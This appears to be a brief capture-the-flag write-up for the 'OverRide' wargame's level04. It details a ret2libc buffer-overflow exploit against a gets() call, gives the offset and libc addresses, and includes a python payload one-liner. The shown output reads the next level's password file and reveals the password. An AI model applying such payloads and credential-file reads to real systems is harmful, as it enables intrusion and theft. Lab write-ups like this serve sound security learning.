We get the binary out of the Vm using this cmd:

`scp -P 4242 level3@192.168.56.103:./level3 .binary/level3`

Rewrite in c

We can exploit the gets function

Offset is 156 (thanks dichotomy)

Get the maxi-best-of of buffer overflow and put it after the offset
* addr system => 0xf7 e6 ae d0
* addr exit   => 0xf7 e5 eb 70
* addr bin/sh => 0xf7 f8 97 ec

python -c "print 'A'* 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" > /tmp/exploit4; cat /tmp/exploit4 - | ./level04 

```
level04@OverRide:~$ python -c "print 'A'* 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7'" > /tmp/exploit4; cat /tmp/exploit4 - | ./level04 
	Give me some shellcode, k
	cat /home/users/level05/.pass
	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```